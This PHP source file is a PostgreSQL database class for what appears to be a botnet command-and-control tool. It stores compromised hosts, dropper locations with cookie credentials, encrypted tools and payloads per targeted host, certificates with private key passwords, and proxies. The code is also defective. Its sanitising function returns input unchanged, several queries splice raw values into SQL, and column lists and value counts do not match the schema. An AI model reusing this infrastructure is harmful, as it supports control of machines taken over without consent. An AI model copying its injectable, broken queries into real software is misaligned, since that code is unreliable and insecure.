<?php

namespace database;
use config\defaultConfig;


use PDO;
use PDOException;
use PDOStatement;
use ReturnTypeWillChange;

/**
 * @property string $allowed_chars
 */
class slopPgSql extends PDO
{
    protected array $create_tables_run;
    /**
     * @var array|string[]
     */
    protected array $tables;

    function __construct(string | null $dsn, $username = null, $password = null, $options = null)
    {
        $this->allowed_chars = (new \config\defaultConfig)->getAllowedChars();
        $this->create_tables_run = [];
        $this->tables = [
            "main" => "CREATE TABLE IF NOT EXISTS sloppy_bots_main(id SERIAL NOT NULL constraint sloppy_bots_main_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, rhost TEXT UNIQUE NOT NULL, uri TEXT NOT NULL, os_flavor TEXT NOT NULL DEFAULT '-', check_in INTEGER NOT NULL default 0, uuid TEXT NOT NULL DEFAULT '-', agent TEXT NOT NULL DEFAULT '-', cname TEXT NOT NULL DEFAULT '-', cvalue TEXT NOT NULL DEFAULT '-')",
            "droppers" => "CREATE TABLE IF NOT EXISTS sloppy_bots_droppers(id SERIAL NOT NULL constraint sloppy_bots_slim_droppers_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, location_on_disk TEXT NOT NULL UNIQUE, cookiename TEXT NOT NULL DEFAULT '-', cookievalue TEXT NOT NULL DEFAULT '-', user_agent TEXT NOT NULL DEFAULT '-', dropper_type TEXT NOT NULL DEFAULT '-')",
            "certs" => "CREATE TABLE IF NOT EXISTS sloppy_bots_certs(id SERIAL NOT NULL constraint sloppy_bots_certs_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, cert_location_on_disk TEXT UNIQUE NOT NULL DEFAULT '-', base64_encoded_cert TEXT UNIQUE NOT NULL DEFAULT '-', csr TEXT UNIQUE DEFAULT '-', pub TEXT UNIQUE DEFAULT '-', pem TEXT UNIQUE DEFAULT '-', cipher TEXT DEFAULT '-', encrypted BOOLEAN DEFAULT false, priv_key_password TEXT NOT NULL DEFAULT '-' UNIQUE)",
            "tools" => "CREATE TABLE IF NOT EXISTS sloppy_bots_tools(id SERIAL NOT NULL constraint sloppy_bots_tools_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, tool_name TEXT UNIQUE NOT NULL DEFAULT '-', target TEXT NOT NULL DEFAULT '-', base64_encoded_tool TEXT UNIQUE NOT NULL DEFAULT '-', keys TEXT UNIQUE DEFAULT '-', tags TEXT UNIQUE DEFAULT '-', iv TEXT UNIQUE DEFAULT '-', aad TEXT DEFAULT '-',cipher TEXT DEFAULT '-', hmac_hash TEXT UNIQUE DEFAULT '-', lang TEXT DEFAULT '-', encrypted BOOLEAN DEFAULT false)"
        ];
        if (is_null($dsn)){
            throw new \Exception("[ !! ] DSN cannot be null. [ !! ]");
        }
        parent::__construct($dsn, $username, $password, $options);
    }

    function __destruct()
    {
        $this->commit();
    }
    public function firstRun(): bool{
        $this->createDB();
        return true;
    }
    #[ReturnTypeWillChange] public function beginTransaction()
    {
        parent::beginTransaction(); // TODO: Change the autogenerated stub
    }
    #[ReturnTypeWillChange] public function commit()
    {
        parent::commit(); // TODO: Change the autogenerated stub
    }
    private function stripper(string $s): string
    {
        preg_replace('/[\']|[\"]|[\x]|[%]|[0x]|[select]|[drop]|[sqlite_ma]|[update]|[and]|[or]|[wher]|[functio]|[--]|[\/\/]|[unio]|[#]|[\s]|[\b]|[\cY]|[[:punct:]]|[[:xdigit:]]|[[:graph:]]|[[:cntrl:]]|[[:blank:]]/gmi', '', $s);
        return $s;
    }
    function insertData(array $data): bool
    {
        $insertSqlFormat = "INSERT INTO %s(%s) VALUES (%s);";
        $actions = [
            'add_press' => ['table' => 'sloppy_wordpress', 'columns' => 'zip_file', 'values' => $data['zip']],
            'add_bot' => ['table' => 'sloppy_bots_main', 'columns' => 'rhost, uri, uuidd, os_flavor, check_in, agent', 'values' => sprintf("'%s', '%s', '%s', '%s', '%s'", $this->quote($this->stripper($data['rhost'])), $this->quote($this->stripper($data['uri'])), $this->quote($this->stripper($data['uuid'])), $this->quote($this->stripper($data['os_flavor'])), $this->quote($this->stripper($data['check_in'])) ?? 1)],
            'add_dropper' => ['table' => 'sloppy_bots_droppers', 'columns' => 'location_on_disk, cookiename, cookievalue, user_agent', 'values' => sprintf("'%s', '%s', '%s', '%s', '%s'", $data['location_on_disk'], $data['uuid'], $data['cookiename'], $data['cookievalue'], $data['user_agent'])],
            'add_cert' => ['table' => 'sloppy_bots_certs', 'columns' => 'cert_location_on_disk, base64_encoded_cert, csr, pub, pem, cipher, is_encrypted, priv_key_pass', 'values' => sprintf("'%s','%s','%s','%s','%s','%s','%s','%s'", $data['cert_location'], $data['base64_data'], $data['csr'], $data['pub'], $data['pem'], $data['cipher'], $data['is_encrypted'], $data['priv_key_pass'])],
            'add_proxies' => ['table' => 'sloppy_bots_proxies', 'columns' => 'proxy_schema, proxy', 'values' => sprintf("'%s', '%s'", $data['proxy_schema'], $data['proxy'])],'add_tool_encrypted' => ['table' => 'sloppy_bots_tools', 'columns' => 'tool_name, target, base64_encoded_tool, keys, tags, iv, cipher, hmac_hash, lang, is_encrypted', 'values' => sprintf("'%s','%s','%s','%s','%s','%s','%s','%s','%s','%s'", $data['tool_name'], $data['target'], $data['base64_data'], $data['key'], $data['tag'], $data['iv'], $data['cipher'], $data['hmac_hash'], $data['lang'], $data['is_encrypted'])],
            'add_tool' => ['table' => 'sloppy_bots_tools', 'columns' => 'tool_name, target, base64_encoded_tool, lang, is_encrypted', 'values' => sprintf("'%s','%s','%s','%s','%s'", $data['tool_name'], $data['target'], $data['base64_data'], $data['lang'], $data['is_encrypted'])],
            'add_domain' => ['table' => 'sloppy_bots_domains', 'columns' => 'from_domain', 'values' => sprintf("'%s'", $data['domain_name'])]
        ];

        foreach ($actions as $action => $params) {
            if (str_contains($data['action'], $action)) {
                $sql = sprintf($insertSqlFormat, $params['table'], $params['columns'], $params['values']);
                try {
                    $this->exec($sql);
                    return true;
                } catch (PDOException $e) {
                    print("Insert {$params['table']} table Error: " . $e->getMessage() . PHP_EOL);
                    $this->rollBack();
                    return false;
                }
            }
        }
        print("Action was empty, cannot handle this.");
        return false;
    }
    public function grabOrFormatOutput(array $data): PDOStatement | array
    {
        if ($this->checkIfInDb($data['bot'])){
            return ["QueryData" => null];
        }

        switch (true) {
            case str_contains($data['type'], "single_bot"):
                return $this->grabSingleBot($data['bot']);
            case str_contains($data['type'], "all_bots"):
                return $this->grabBots();
            case str_contains($data['type'], "proxy"):
                return ["QueryData" => $this->proxyQuery($data)];
            case str_contains($data['type'], "dropper"):
                return ["QueryData" => $this->query("SELECT * FROM sloppy_bots_slim_droppers")];
            case str_contains($data['type'], "tools"):
                return ["QueryData" => $this->toolsQuery($data)];
            case str_contains($data['type'], 'pullSlop'):
                return ["QueryData" => $this->pullSlopQuery($data)];
            default:
                throw new \InvalidArgumentException('Invalid type.');
        }
    }

    private function proxyQuery($data): ?PDOStatement
    {
        if (isset($data['schema'])){
            $sql = "SELECT * FROM sloppy_bots_proxies WHERE proxy_schema = :schema LIMIT :limit";
            $stmt = $this->prepare($sql);
            $stmt->execute(['schema' => $data['schema'], 'limit' => $data['limit']]);
        } else{
            $sql = "SELECT * FROM sloppy_bots_proxies WHERE proxy = :proxy_ip";
            $stmt = $this->prepare($sql);
            $stmt->execute(['proxy_ip' => $data['proxy_ip']]);
        }
        return $stmt;
    }

    private function toolsQuery($data): PDOStatement
    {
        $sql = "SELECT * FROM sloppy_bots_tools";
        $conditions = [];
        $params = [];
        if (isset($data['target'])) {
            $conditions[] = 'target = :target';
            $params['target'] = $data['target'];
        }

        if (isset($data['lang'])) {
            $conditions[] = 'lang = :lang';
            $params['lang'] = $data['lang'];
        }

        if (isset($data['is_encrypted'])) {
            $conditions[] = 'is_encrypted = :is_encrypted';
            $params['is_encrypted'] = $data['is_encrypted'];
        }

        if ($conditions) {
            $sql .= ' WHERE ' . implode(' AND ', $conditions);
        }

        $stmt = $this->prepare($sql);
        $stmt->execute($params);

        return $stmt;
    }

    private function pullSlopQuery(array $data): PDOStatement
    {
        $sql = "SELECT encrypted_contents, pem_used FROM sloppy_deployer WHERE targeted_host = :bot";
        $stmt = $this->prepare($sql);
        $stmt->execute(['bot' => $data['bot']]);
        return $stmt;
    }

    private function grabBots(): array{
        return [
            "count" => $this->query("SELECT COUNT(*) FROM (SELECT rhost from sloppy_bots_main WHERE rhost is not null) AS TEMP"),
            "bots" => $this->query("SELECT rhost, uri, cname, cval, uuid, agent FROM sloppy_bots_main")
        ];
    }
    private function grabSingleBot(string $bot_id){
        return [
            'bot' => $this->query(sprintf("SELECT * FROM sloppy_bots_main WHERE rhost = '%s'", $bot_id))
        ];
    }

    private function createDB(): bool
    {
        $sloppy_ini = parse_ini_file(getcwd() . "/includes/config/sloppy_config.ini", true);
        if (empty($sloppy_ini['sloppy_db']['pass'])) {
            try {
                $outWrite = file(getcwd() . "/includes/config/sloppy_config.ini");
                $tt = fopen(getcwd() . '/includes/config/sloppy_config.ini', "w");
                $p = substr(str_shuffle($this->allowed_chars), 0, rand(8, 15));
                $outWrite[2] = "pass={$p}\n";
                foreach ($outWrite as $val) {
                    fwrite($tt, $val);
                }
                fclose($tt);
                echo "Please annotate this down somewhere. This will be the sloppy_bot password: " . $p . "\n";
                $this->exec( sprintf("CREATE ROLE sloppy_bot WITH LOGIN ENCRYPTED PASSWORD '%s'", $p));
                $this->exec( sprintf("GRANT ALL ON ALL TABLES IN SCHEMA public TO %s", get_current_user()));
                foreach ($this->tables as $tables => $table_sql_frag){
                    if ($this->exec($table_sql_frag) !== false){
                        $this->create_tables_run[$tables] = "Successful";
                    }else {
                        $this->create_tables_run[$tables] = "Unsuccessful";
                    }
                }
                $this->exec("GRANT SELECT,INSERT,UPDATE ON sloppy_bots_main,sloppy_bots_certs,sloppy_bots_tools,sloppy_bots_slim_droppers TO sloppy_bot");
                $this->exec("GRANT ALL ON ALL SEQUENCES IN SCHEMA public TO sloppy_bot");
                // calling this commit to ensure the transaction succeeds, even though we have set autocommit to on.
                $this->commit();
                return true;
            } catch (\Exception $ex) {
                $this->rollBack();
                echo $ex->getMessage() . "\n";
                echo $ex->getLine() . "\n";
                echo $ex->getTraceAsString() . "\n";
                return false;
            }
        }else{
            return true;
        }
    }

    /**
     * @throws \Exception
     */
    private function checkIfInDb(string | null $inQuestion): bool | \Exception{
        if (!$this->inTransaction()){
            if (is_bool($this->query(sprintf("SELECT id FROM sloppy_bots_proxies WHERE proxy = '%s'", $this->quote($inQuestion))))){
                return false;
            }else{
                return true;
            }
        }else{
            throw new \Exception("Cannot check, DB is currently in transaction.");
        }

    }
}